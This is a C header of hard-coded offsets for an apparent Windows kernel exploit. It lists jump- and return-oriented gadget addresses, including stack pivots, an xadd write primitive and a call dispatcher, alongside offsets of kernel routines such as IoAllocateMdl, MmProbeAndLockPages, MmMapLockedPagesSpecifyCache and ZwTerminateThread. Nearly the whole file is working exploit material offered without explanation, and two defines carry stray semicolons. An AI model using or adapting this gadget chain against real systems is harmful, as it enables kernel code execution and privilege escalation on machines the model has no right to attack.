#ifndef JOP_OFFSETS_H
#define JOP_OFFSETS_H

// 0x14071ec3c: push rax ; nop ; jmp rbx
#define OFFSET_PUSH_RAX_JMP_RBX 0x0a80e83;

// call rbp ; jmp qword [rsi-0x77] ;
#define OFFSET_CALL_RBP_JMP_DEREF_RSI 0x6cbc16
#define CALL_GADGET_RBP_OFFSET 0x77

//0x1406cbc16: call rbp ; jmp qword [rsi-0x77] ; 
// 0x1402b5984: pop rax ; push rdi ; cmc ; jmp qword [rsi+0x3B] ; (1 found)

// xadd qword [rcx+0x00000648], rdx ; ret ;
#define ADD_GADGET 0x6532c4
#define ADD_GADGET_OFFSET 0x648

#define LONGJUMP_INTERNAL 0x410740 // ok
#define LONGJUMP 0x3d1920 // ok

#define SGDGetUserSessionState 0x12c0
#define GafKeyMap_OFFSET 0x36A8

// mov rax, qword [rsp+0x20] ; mov rcx, qword [rsp+0x28] ; mov rdx, qword [rsp+0x30] ;
// mov r8, qword [rsp+0x38] ; mov r9, qword [rsp+0x40] ; add rsp, 0x48 ; jmp rax ;

// MOV        RCX ,qword ptr [RDI  + 0x70 ]
// MOV        RAX ,qword ptr [RDI  + 0xa0 ]
// MOV        RDI ,qword ptr [RDI  + 0x78 ]
// JMP        RCX
#define HALP_LM_INDENTITY_STUB 0x410862 // ok
#define IO_ALLOCATE_MDL 0x2def20 // ok 
#define MEMCPY 0x42b8c0
#define MM_PROBE_AND_LOCK_PAGES 0x26bfd0
#define MM_MAP_LOCKED_PAGES_SPECIFY_CACHE 0x025b9b0
#define ZW_TERMINATE_THREAD 0x411970

#define MOV_RCX_R13_CALL_RAX 0x3d3900 // ok

#define LOAD_ARGS 0xaf53ea // ok
#define CALL_DISPATCHER 0xaf53e8


// 0x1402b5984: pop rax ; push rdi ; cmc ; jmp qword [rsi+0x3B] ; (1 found)
#define POP_RAX_JMP_DEREF_RSI 0x02b5984
#define POP_RAX_RSI_OFFSET 0x3B

#define POP_RSP_RET 0x067b95c
#define ADD_RSP_POP_RSI_RET 0x8453de

#define ADD_RSP_JMP_R8 0xb0f5bf;

// mov qword [rsi], rax ; mov rbx, qword [rsp+0x60] ; mov rsi, qword [rsp+0x68] ; add rsp, 0x50 ; pop rdi ; ret
#define SAVE_RAX 0xa9846e

// add rsp, 0x50 ; pop rbp ; ret
#define POP_RBP 0x67ee9b


#endif